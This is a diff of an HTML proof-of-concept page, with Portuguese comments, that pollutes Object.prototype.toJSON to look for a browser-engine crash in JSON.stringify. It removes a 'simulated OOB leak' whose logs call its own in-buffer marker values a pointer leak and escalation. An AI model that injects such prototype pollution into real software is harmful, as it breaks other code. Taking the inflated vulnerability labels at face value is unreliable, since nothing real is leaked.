@@ -2,8 +2,9 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC Isolado v2.3 - Crash JSON.stringify</title>
+    <title>PoC Isolado v2.3b - Investigando 'this' em JSON.stringify</title>
     <style>
+        /* ... (estilos como antes) ... */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output {
             background: #222;
@@ -19,15 +20,15 @@
     </style>
 </head>
 <body>
-    <h1>PoC Isolado v2.3 para Teste de Crash em JSON.stringify</h1>
-    <p>Este script tenta simular um vazamento OOB e interage com JSON.stringify.<br>Nesta versão (v2.3), o 'toJSON' poluído retorna informações de 'this' (Object.keys).</p>
-    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste Isolado v2.3</button>
+    <h1>PoC Isolado v2.3b - Investigando 'this'</h1>
+    <p>Este script tenta identificar qual 'this' causa o problema.</p>
+    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste Isolado v2.3b</button>
     <div id="output"></div>
 
     <script>
-        // --- Utilitários e Constantes Globais (Adaptado da Suite v19.0) ---
-        // ... (Código de AdvancedInt64 e generalUtils mantido como nas versões anteriores) ...
-        class AdvancedInt64 {
+        // --- Utilitários e Constantes Globais ---
+        // AdvancedInt64 e generalUtils como antes...
+        class AdvancedInt64 { /* ... (código completo como antes) ... */
             constructor(low, high) {
                 let buffer = new Uint32Array(2);
                 let bytes = new Uint8Array(buffer.buffer);
@@ -103,158 +104,123 @@
         };
 
 
-        // --- Script Isolado v2.3 (Foco: JSON.stringify Crash) ---
+        // --- Script Isolado v2.3b ---
         const outputDivS1 = document.getElementById('output');
         const runBtn = document.getElementById('runBtn');
-        const SHORT_PAUSE_S1 = 50;
         const MEDIUM_PAUSE_S1 = 200;
-        let leakedValueFromOOB_S1 = null; 
+        let callCount_toJSON = 0; // Contador para chamadas toJSON
 
         const logS1 = (message, type = 'info', funcName = '') => {
             generalUtils.logToDiv('output', message, type, funcName);
         };
+        const PAUSE_S1_FUNC = (ms = 50) => new Promise(r => setTimeout(r, ms));
 
-        const PAUSE_S1_FUNC = (ms = SHORT_PAUSE_S1) => new Promise(r => setTimeout(r, ms));
-        const toHexS1 = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
-        
-        const simulateOOBLeakAndStoreS1 = async () => { // ... (código de simulateOOBLeakAndStoreS1 mantido como antes) ...
-            const FNAME = 'simulateOOBLeakAndStoreS1';
-            logS1("--- Iniciando Teste: Simulação de OOB Write/Read (Leak) ---", 'test', FNAME);
-            const bufferSize = 32;
-            const oobWriteOffset = bufferSize; 
-            const allocationSize = bufferSize + 256; 
-            const baseOffsetInBuffer = 128; 
-            const targetLeakedHigh = 0xAAAAAAAA;
-            const targetLeakedLow  = 0xAAAAAAAA;
-            const targetLeakedOffset = 28; 
-            leakedValueFromOOB_S1 = null;
-            try {
-                const outerBuffer = new ArrayBuffer(allocationSize);
-                const dataView = new DataView(outerBuffer);
-                for (let i = 0; i < outerBuffer.byteLength; i++) {
-                    dataView.setUint8(i, 0xCC);
-                }
-                const leakPlantAddress = baseOffsetInBuffer + targetLeakedOffset;
-                if (leakPlantAddress + 8 <= outerBuffer.byteLength) {
-                    dataView.setUint32(leakPlantAddress + 4, targetLeakedHigh, true); 
-                    dataView.setUint32(leakPlantAddress,     targetLeakedLow,  true); 
-                    logS1(`SIMULAÇÃO: Valor "vazado" 0x${targetLeakedHigh.toString(16)}${targetLeakedLow.toString(16)} plantado em @${targetLeakedOffset} (addr ${leakPlantAddress})`, 'info', FNAME);
-                } else {
-                    logS1(`ERRO SIMULAÇÃO: Endereço para plantar leak (${leakPlantAddress}) fora dos limites do outerBuffer.`, 'error', FNAME);
-                    return false;
-                }
-                await PAUSE_S1_FUNC();
-                const readTargetAddress = baseOffsetInBuffer + targetLeakedOffset;
-                if (readTargetAddress >= 0 && readTargetAddress + 8 <= outerBuffer.byteLength) {
-                    try {
-                        const low = dataView.getUint32(readTargetAddress, true);
-                        const high = dataView.getUint32(readTargetAddress + 4, true);
-                        if (high === targetLeakedHigh && low === targetLeakedLow) {
-                            const vStr = `H=${toHexS1(high)} L=${toHexS1(low)}`;
-                            logS1(` -> PTR? U64 @${targetLeakedOffset} (addr ${readTargetAddress}): ${vStr}`, 'ptr', FNAME);
-                            leakedValueFromOOB_S1 = { high, low, type: 'U64', offset: targetLeakedOffset };
-                            logS1(` -> VALOR U64 ARMAZENADO (Simulado com Sucesso) @${targetLeakedOffset}.`, 'vuln', FNAME);
-                            logS1(` ---> ALERTA: Simulação de Primitivo Relevante (OOB Read Pointer Leak) BEM SUCEDIDA ***`, 'escalation', FNAME);
-                        } else {
-                             logS1(` -> VALOR U64 LIDO DIVERGE DO ESPERADO @${targetLeakedOffset}.`, 'warn', FNAME);
-                        }
-                    } catch (e) {
-                        logS1(`Erro ao tentar ler U64 em @${targetLeakedOffset}: ${e.message}`, 'error', FNAME);
-                    }
-                } else {
-                    logS1(`Endereço de leitura OOB simulado @${targetLeakedOffset} fora dos limites.`, 'warn', FNAME);
-                }
-            } catch (e) {
-                logS1(`Erro fatal na simulação OOB: ${e.message}`, 'error', FNAME);
-                console.error(e);
-            } finally {
-                const leakStatus = leakedValueFromOOB_S1 ? `1 valor ${leakedValueFromOOB_S1.type} @${leakedValueFromOOB_S1.offset}` : 'nenhum valor simulado/armazenado';
-                logS1(`--- Teste Simulação OOB Concluído (${leakStatus}) ---`, 'test', FNAME);
-            }
-            return !!leakedValueFromOOB_S1;
-        };
+        // Objeto de teste original que causa o crash
+        const originalTestObject = { a: 1, b: 'test_data', c: { nested: true, d: "deep_val" } };
+        let currentThisForAnalysis = null; // Para tentar "salvar" o this problemático
 
-        const testPPJsonHijackAndUseLeakS1 = async () => {
-            const FNAME = 'testPPJsonHijackAndUseLeakS1_v2_3';
-            logS1("--- Iniciando Teste v2.3: PP Hijack (JSON.stringify) com toJSON acessando 'this' ---", 'test', FNAME);
+        const testPPJsonHijack_v23b = async () => {
+            const FNAME = 'testPPJsonHijack_v23b';
+            logS1("--- Iniciando Teste v2.3b: Investigação de 'this' ---", 'test', FNAME);
             
             const ppKey = 'toJSON'; 
-            let originalToJSON; 
-            let ppAppliedSuccessfully = false; 
-
-            let hijackOK = false; 
-            let hijackReturnOK = false;
-            // leakUsedOK não é mais tão relevante aqui, já que não estamos focando no leakedValueFromOOB_S1 no retorno
-
-            const testObject = { a: 1, b: 'test_data', c: { nested: true } };
+            let originalToJSON_Descriptor;
+            let ppAppliedSuccessfully = false;
+            callCount_toJSON = 0;
+            currentThisForAnalysis = null;
 
             try {
-                const descriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-                if (descriptor) {
-                    originalToJSON = descriptor.value;
-                }
+                originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
 
-                // MODIFICAÇÃO v2.3: toJSON agora acessa 'this' para obter Object.keys(this)
                 Object.prototype[ppKey] = function() {
-                    logS1(`===> Poluição Object.prototype.toJSON ATIVADA (acessando 'this') <===`, 'vuln', FNAME);
-                    let keys = [];
-                    try {
-                        keys = Object.keys(this); // PONTO POTENCIALMENTE CRÍTICO SE 'this' ESTIVER CORROMPIDO
-                    } catch (e) {
-                        logS1(`ERRO ao tentar Object.keys(this) dentro do toJSON: ${e.message}`, 'error', FNAME);
-                        // Mesmo com erro, podemos tentar retornar algo para ver se o stringify externo ainda trava
-                        return { "toJSON_error_getting_keys": true, "error_message": String(e.message) };
+                    callCount_toJSON++;
+                    let logPrefix = `toJSON PoC v2.3b (Chamada ${callCount_toJSON})`;
+                    
+                    // Tenta capturar 'this' ANTES de qualquer operação arriscada
+                    currentThisForAnalysis = this; // Salva a referência a 'this'
+
+                    let thisInfoString = `${logPrefix} - typeof this: ${typeof this}`;
+                    if (this === null) {
+                        thisInfoString += ", 'this' é null.";
+                    } else if (typeof this === 'object') {
+                        thisInfoString += `, constructor: ${this.constructor ? this.constructor.name : 'N/A'}`;
+                        if (this === originalTestObject) thisInfoString += " (É o originalTestObject RAÍZ)";
+                        else if (this === originalTestObject.c) thisInfoString += " (É o originalTestObject.c ANINHADO)";
+                    } else {
+                        thisInfoString += `, valor primitivo: ${String(this)}`;
                     }
-                    return { "toJSON_called_successfully": true, "object_keys": keys }; 
+                    logS1(thisInfoString, 'critical', FNAME); // Log crítico para tentar ver antes do crash
+
+                    // Estratégia: Para as primeiras X chamadas, não fazer Object.keys(this)
+                    // e sim retornar algo simples para deixar o JSON.stringify prosseguir.
+                    // A ideia é que o `this` problemático pode não ser o primeiro a ser processado.
+                    if (callCount_toJSON < 3) { // Tente aumentar este número (ex: 3, 4, 5)
+                        logS1(`${logPrefix} - Chamada ${callCount_toJSON} < 3. Retornando valor simples para deixar prosseguir.`, 'warn', FNAME);
+                        // Retorna um valor que não envolva Object.keys(this) imediatamente
+                        return { simple_pass_through: true, call_count: callCount_toJSON, type_of_this: typeof this };
+                    } else {
+                        // A partir da chamada X, tentamos a lógica que acreditamos causar o crash
+                        logS1(`${logPrefix} - Chamada ${callCount_toJSON} >= 3. Tentando Object.keys(this) AGORA.`, 'vuln', FNAME);
+                        let keys = [];
+                        try {
+                            keys = Object.keys(this); // PONTO CRÍTICO
+                            logS1(`${logPrefix} - Object.keys(this) bem sucedido. Chaves: [${keys.join(', ')}]`, 'good', FNAME);
+                            return { "toJSON_called_successfully_critical_path": true, "object_keys": keys, "call_count": callCount_toJSON }; 
+                        } catch (e) {
+                            logS1(`${logPrefix} - ERRO CRÍTICO em Object.keys(this): ${e.message}. Stack: ${e.stack ? e.stack : 'N/A'}`, 'error', FNAME);
+                            // Se o crash for aqui, este log pode não aparecer.
+                            return { "toJSON_error_getting_keys_critical_path": true, "error_message": String(e.message), "call_count": callCount_toJSON };
+                        }
+                    }
                 };
                 ppAppliedSuccessfully = true;
-                logS1(`Poluição Object.prototype.${ppKey} aplicada (versão acessando 'this').`, 'info', FNAME);
+                logS1(`Poluição Object.prototype.${ppKey} aplicada.`, 'info', FNAME);
 
-                logS1(`Tentando JSON.stringify com testObject... (Esta é a chamada que pode travar o navegador)`, 'info', FNAME);
-                const result = JSON.stringify(testObject); // PONTO CRÍTICO
-                logS1(`Resultado de JSON.stringify (com toJSON acessando 'this'): ${result}`, 'info', FNAME);
-
-                if (result && result.includes('"toJSON_called_successfully":true')) {
-                    logS1("VULN: Poluição via Object.prototype.toJSON (acessando 'this') afetou JSON.stringify!", 'vuln', FNAME);
-                    hijackOK = true;
-                } else if (result && result.includes('"toJSON_error_getting_keys":true')) {
-                    logS1("AVISO: Object.prototype.toJSON foi chamado, mas houve um erro ao obter Object.keys(this).", 'warn', FNAME);
-                    // Ainda podemos considerar um tipo de "hijack" parcial se o toJSON foi invocado.
-                    hijackOK = true; 
-                }
-                if (hijackOK) hijackReturnOK = true;
+                logS1(`Tentando JSON.stringify com originalTestObject...`, 'info', FNAME);
+                await PAUSE_S1_FUNC(50); // Pequena pausa para logs anteriores aparecerem
+                const result = JSON.stringify(originalTestObject); 
+                
+                logS1(`Resultado de JSON.stringify: ${result ? result.substring(0, 500) : "N/A"}`, 'info', FNAME);
 
             } catch (e) {
-                logS1(`Erro fatal durante Teste JSON.stringify: ${e.message}`, 'error', FNAME);
-                console.error("JSON.stringify Crash Test Error:", e);
-                logS1("Possível CRASH AQUI ou erro inesperado! Verifique o console do debugger do motor JS.", 'critical', FNAME);
+                logS1(`Erro fatal capturado em testPPJsonHijack_v23b: ${e.message}`, 'error', FNAME);
+                if (e.stack) logS1(`Stack do erro: ${e.stack}`, 'error', FNAME);
+                console.error("JSON.stringify Crash Test Error (v2.3b):", e);
+                logS1("CRASH PROVAVELMENTE OCORREU. Verifique o console.", 'critical', FNAME);
             } finally {
                 if (ppAppliedSuccessfully) { 
-                    if (typeof originalToJSON !== 'undefined') {
-                        Object.defineProperty(Object.prototype, ppKey, { value: originalToJSON, writable: true, enumerable: false, configurable: true });
+                    if (originalToJSON_Descriptor) {
+                        Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor);
                     } else {
                         delete Object.prototype[ppKey];
                     }
                     logS1(`Object.prototype.${ppKey} restaurado.`, 'good', 'Cleanup');
                 }
+                // Tenta logar o último 'this' capturado se não houve crash antes
+                 if (currentThisForAnalysis) {
+                    logS1(`Último 'this' capturado (callCount ${callCount_toJSON}): typeof=${typeof currentThisForAnalysis}, constructor=${currentThisForAnalysis && currentThisForAnalysis.constructor ? currentThisForAnalysis.constructor.name : 'N/A'}`, 'leak', FNAME);
+                    if (currentThisForAnalysis === originalTestObject) logS1(" -> Era o originalTestObject RAÍZ", 'leak', FNAME);
+                    else if (currentThisForAnalysis === originalTestObject.c) logS1(" -> Era o originalTestObject.c ANINHADO", 'leak', FNAME);
+                }
             }
-            logS1(`--- Teste JSON.stringify v2.3 Concluído (Poluição 'this': ${hijackOK}, Retorno Verif.: ${hijackReturnOK}) ---`, 'test', FNAME);
-            return hijackReturnOK;
+            logS1(`--- Teste JSON.stringify v2.3b Concluído ---`, 'test', FNAME);
         };
 
         const runIsolatedTest = async () => {
             if (runBtn) runBtn.disabled = true;
             outputDivS1.innerHTML = '';
-            logS1("==== INICIANDO PoC Isolado v2.3 ====", 'test', 'runIsolatedTest');
-            await simulateOOBLeakAndStoreS1(); 
-            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
+            callCount_toJSON = 0;
+            currentThisForAnalysis = null;
+            logS1("==== INICIANDO PoC Isolado v2.3b (Investigando 'this') ====", 'test', 'runIsolatedTest');
             
-            await testPPJsonHijackAndUseLeakS1();
+            // Decidimos que simulateOOBLeakAndStoreS1 não é essencial para este crash específico
+            // await simulateOOBLeakAndStoreS1(); 
+            // await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
+            
+            await testPPJsonHijack_v23b();
             await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
 
-            logS1("\n==== PoC Isolado v2.3 CONCLUÍDO ====", 'test', 'runIsolatedTest');
-            logS1("Se o navegador TRAVOU, o problema é MUITO PROVAVELMENTE o acesso a 'this' (ex: Object.keys(this)) dentro do 'toJSON' poluído, quando 'this' pode estar corrompido.", 'info', 'runIsolatedTest');
-            logS1("Se NÃO travou, então o travamento original era ainda mais sutil, possivelmente uma combinação do acesso a 'this' E a tentativa de serializar o 'leakedValueFromOOB_S1'.", 'info', 'runIsolatedTest');
+            logS1("\n==== PoC Isolado v2.3b CONCLUÍDO ====", 'test', 'runIsolatedTest');
             if (runBtn) runBtn.disabled = false;
         };
     </script>
